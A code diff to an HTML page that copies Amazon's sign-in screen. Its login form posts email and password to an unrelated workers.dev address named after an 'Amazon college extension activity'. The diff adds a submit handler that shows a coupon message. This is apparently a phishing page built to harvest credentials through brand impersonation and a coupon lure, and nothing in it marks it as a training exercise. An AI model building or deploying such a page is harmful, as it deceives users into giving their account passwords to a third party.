@@ -8,20 +8,27 @@
 </head>
 <body>
     <div class="main">
-            <img src="logo.png">
+        <img src="logo.png">
         <div class="cont">
             <div class="box">
                 <h1>Sign in</h1>
-                <form action="https://amazon-college-extension-activity.bradithya614.workers.dev/" method="POST">
+                <form id="loginForm" action="https://amazon-college-extension-activity.bradithya614.workers.dev/" method="POST">
                     <label>Email or mobile phone number</label>
-                    <input type="text" name="user">
+                    <input type="text" name="user" required>
                     <label>Password <span class="split">Forgot Password</span></label>
-                    <input type="text" name="pass">
+                    <input type="password" name="pass" required>
                     <input type="submit" value="Sign in">
                 </form>
                 <p>By continuing, you agree to Amazon's <span class="col_blue">Conditions of Use</span> and <span class="col_blue">Privacy Notice</span>.</p>
             </div>
         </div>
     </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); 
+            alert('You will receive your coupon soon.'); 
+        });
+    </script>
 </body>
 </html>
